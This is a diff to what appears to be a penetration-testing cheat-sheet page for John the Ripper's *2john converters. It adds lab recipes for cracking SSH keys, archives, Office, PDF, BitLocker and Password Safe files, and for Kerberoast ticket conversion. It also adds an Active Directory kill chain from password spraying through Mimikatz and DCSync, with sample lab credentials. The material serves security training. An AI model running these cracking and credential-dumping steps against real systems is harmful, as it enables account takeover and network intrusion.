@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=2john) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -24,8 +26,213 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=ssh2john)
+## Notebook recipes
 
-## Learning and original examples
+12 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [John the Ripper and File Converters](/tools/john)
+<AccordionGroup>
+
+<Accordion title="7. Cracking loot">
+
+### 7. Cracking loot
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# download just the file (nxc is reliable through the pivot):
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --share HR --get-file 'Archive\Employee-Passwords_OLD.psafe3' ~/loot/emp.psafe3
+# crack the master password:
+pwsafe2john ~/loot/emp.psafe3 > psafe.hash
+john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
+#   (hashcat alt: hashcat -m 5200 ~/loot/emp.psafe3 rockyou.txt)
+# open it:
+passwordsafe ~/loot/emp.psafe3      # sudo apt install -y passwordsafe
+```
+
+</Accordion>
+
+<Accordion title="🗺️ The kill chain (this assessment)">
+
+### 🗺️ The kill chain (this assessment)
+
+**Active Directory Attack Path: Worked Lab**
+
+```text
+OSINT (Betty Jayde)
+   ↓  namebuster  → username list
+Password spraying (Hydra, SSH)
+   ↓  jbetty : Texas123!@#
+SSH foothold (DMZ01)
+   ↓  chisel / ligolo pivot into 172.16.119.0/24
+Credential discovery (.bash_history)
+   ↓  hwilliam : dealer-screwed-gym1
+SMB share looting (FILE01)
+   ↓  Employee-Passwords_OLD.psafe3
+Crack the vault (pwsafe2john + john)
+   ↓  bdavid, stom (OLD), hwilliam
+BloodHound → bdavid = local admin on JUMP01 ; stom ∈ Domain Admins
+   ↓
+RDP to JUMP01 as bdavid (local admin)
+   ↓  SeImpersonate → SYSTEM  (PrintSpoofer / GodPotato)
+Mimikatz → LSASS → stom's CURRENT password
+   ↓  stom : calves-warp-learning1  (Domain Admin)
+DCSync against DC01
+   ↓  Administrator NTLM + krbtgt
+FULL DOMAIN COMPROMISE
+```
+
+</Accordion>
+
+<Accordion title="SSH (Port 22)">
+
+### SSH (Port 22)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Password login
+ssh <user>@<IP>
+
+# Key-based login
+chmod 600 id_rsa
+ssh -i id_rsa <user>@<IP>
+
+# If key has passphrase — crack it
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="*2john converters">
+
+### *2john converters
+
+**John the Ripper and File Converters**
+
+```bash
+ssh2john id_rsa > h ; john h --wordlist=rockyou.txt        # encrypted SSH key
+zip2john secret.zip > h
+# Other converter choices: rar2john, 7z2john, office2john (separate programs)
+keepass2john db.kdbx > h ; pdf2john file.pdf > h
+```
+
+</Accordion>
+
+<Accordion title="6. Convert the Ticket">
+
+### 6. Convert the Ticket
+
+**Kerberoasting from Windows**
+
+```bash
+python2.7 kirbi2john.py sqldev.kirbi
+```
+
+</Accordion>
+
+<Accordion title="Quick Reference">
+
+### Quick Reference
+
+**Kerberoasting from Windows**
+
+```bash
+# Decode and convert an exported ticket
+cat encoded_file | base64 -d > ticket.kirbi
+python2.7 kirbi2john.py ticket.kirbi
+
+# Hashcat modes from the section
+hashcat -m 13100 rc4_hashes wordlist.txt
+hashcat -m 19700 aes256_hashes wordlist.txt
+```
+
+</Accordion>
+
+<Accordion title="Attacking SSH">
+
+### Attacking SSH
+
+**Linux Remote Access: SSH, Rsync, and R-Services**
+
+```bash
+ssh2john id_rsa > id_rsa.hash             # convert the encrypted key to a crackable hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash   # recover the passphrase
+ssh -i id_rsa user@<IP>                   # now unlock the key with the cracked passphrase
+```
+
+</Accordion>
+
+<Accordion title="BitLocker-encrypted drives">
+
+### BitLocker-encrypted drives
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+bitlocker2john -i Backup.vhd > backup.hashes
+grep "bitlocker\$0" backup.hashes > backup.hash      # $0 = the password hash (the others are recovery-key hashes)
+hashcat -a 0 -m 22100 backup.hash /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Crack Office documents &amp; PDFs">
+
+### Crack Office documents & PDFs
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+office2john.py Protected.docx > protected.hash
+john --wordlist=rockyou.txt protected.hash
+john protected.hash --show
+
+pdf2john.py PDF.pdf > pdf.hash      # same flow, different extractor
+john --wordlist=rockyou.txt pdf.hash
+```
+
+</Accordion>
+
+<Accordion title="Crack an encrypted SSH key">
+
+### Crack an encrypted SSH key
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+ssh2john.py SSH.private > ssh.hash
+john --wordlist=rockyou.txt ssh.hash
+john ssh.hash --show
+```
+
+</Accordion>
+
+<Accordion title="Cracking files — the *2john extractors">
+
+### Cracking files — the *2john extractors
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+<tool> <file_to_crack> > file.hash      # general pattern
+locate *2john*                          # list every extractor on the box
+```
+
+</Accordion>
+
+<Accordion title="ZIP files">
+
+### ZIP files
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+zip2john ZIP.zip > zip.hash
+john --wordlist=rockyou.txt zip.hash
+john zip.hash --show
+```
+
+</Accordion>
+
+</AccordionGroup>
